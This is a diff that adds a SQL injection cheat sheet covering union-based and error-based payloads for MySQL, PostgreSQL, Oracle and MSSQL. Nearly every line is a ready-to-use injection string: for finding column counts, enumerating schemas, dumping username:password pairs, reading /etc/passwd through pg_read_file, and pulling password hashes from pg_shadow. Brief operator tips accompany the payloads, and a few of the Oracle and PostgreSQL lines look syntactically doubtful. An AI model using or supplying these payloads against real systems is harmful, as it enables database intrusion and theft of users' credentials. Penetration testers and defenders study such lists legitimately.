@@ -1,0 +1,90 @@
+# UNION + ERROR-BASED (visible-output phase)
+# Replace N with actual column count. Comments: MySQL `#` or `-- `, others `-- `.
+# `-- ` MUST have a trailing space in MySQL/PG.
+
+## 1) Column-count discovery (ORDER BY)
+# Keep incrementing n until error/different output.
+' ORDER BY 1-- -
+' ORDER BY 5-- -
+' ORDER BY 50-- -
+1' ORDER BY 1#
+1' ORDER BY 1--
+
+## 2) Column-count via UNION NULL
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+1' UNION SELECT NULL,NULL,NULL#
+" UNION SELECT NULL,NULL,NULL -- -
+
+## 3) Locate a string-renderable column in the output row
+' UNION SELECT 'a',NULL,NULL -- -    -> first col renders text
+' UNION SELECT NULL,'a',NULL -- -    -> second col
+1' UNION SELECT NULL,'a',NULL,NULL#
+# Then swap that column for the data you need.
+
+## 4) Data extraction (MySQL)
+' UNION SELECT @@version,NULL-- -
+' UNION SELECT database(),NULL-- -
+' UNION SELECT user(),NULL-- -
+1' UNION SELECT @@hostname,@@datadir,@@global.version_comment#
+1' UNION SELECT table_schema,NULL FROM information_schema.schemata#
+1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()#
+1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#
+1' UNION SELECT group_concat(concat_ws(0x3a,username,password)),NULL FROM users#
+
+## 5) Data extraction (PostgreSQL)
+' UNION SELECT NULL,version()-- -
+' UNION SELECT NULL,current_database()-- -
+' UNION SELECT NULL,current_user-- -
+' UNION SELECT NULL,table_name FROM information_schema.tables-- -
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT NULL,string_agg(username||':'||password,'\n') FROM users-- -
+# PG >= 9: ENCODED outputs
+' UNION SELECT NULL,encode(pg_read_file('/etc/passwd'),'hex')-- -
+' UNION SELECT NULL,string_agg(encode(pw, 'hex'),',') FROM pg_shadow-- -    # password hashes
+
+## 6) Data extraction (Oracle)
+' UNION SELECT NULL,NULL FROM dual-- -
+' UNION SELECT null,table_name FROM all_tables-- -
+' UNION SELECT null,column_name FROM all_tab_columns WHERE table_name='USERS'-- -
+' UNION SELECT null,username||':'||password FROM all_users-- -
+' UNION SELECT null,(SELECT banner FROM v$version WHERE rownum=1) FROM dual-- -
+# LIMIT replaced by rownum; no LIMIT syntax in Oracle.
+
+## 7) Data extraction (MSSQL)
+' UNION SELECT NULL,NULL-- -
+1' UNION SELECT @@version,NULL-- -
+1' UNION SELECT db_name(),NULL-- -
+1' UNION SELECT name,NULL FROM sys.databases-- -
+1' UNION SELECT name,NULL FROM sys.tables-- -
+1' UNION SELECT name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')-- -
+1' UNION SELECT username+' : '+password,NULL FROM users-- -
+
+## 8) Error-based pull (no output column needed) - MySQL 5.x/8.x
+# extractvalue caps ~32 chars - use SUBSTRING loops.
+' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
+' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
+' AND updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')),1)-- -
+# MySQL 5.7+ JSON error leak (nice, 32-char repeated but works on 8.x)
+' AND JSON_KEYS((SELECT convert((SELECT concat(username,0x3a,password) FROM users LIMIT 1),json)))-- -
+# Old geo/rand-error methods (5.0-5.6)
+' AND (SELECT * FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT(database()))),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+' AND geometrycollection((select * from(select * from(select database())a)b))-- -
+' AND polygon((select * from(select * from(select database())a)b))-- -
+
+## 9) Error-based (PostgreSQL) - cast() leaks type + value
+' AND CAST((SELECT version()) AS int)-- -
+' AND 1=CAST((SELECT current_database()) AS int)-- -
+' AND (SELECT 1/(SELECT version())) IS NULL-- -
+' AND (SELECT 1/(SELECT char(1))) IS NULL-- -
+
+## 10) Error-based (MSSQL) - convert() leaks truncated value
+' AND CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -
+' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -
+# multi-string (x2 i.e. 64 chars per hit)
+' AND 1=CONVERT(int,(SELECT top 2 name FROM sys.tables))-- -
+
+## 11) Oracle XML error leak
+' AND (SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT banner FROM v$version WHERE rownum=1)),1) FROM dual)-- -
+' AND (SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM all_tables WHERE rownum=1)),1) FROM dual)-- -
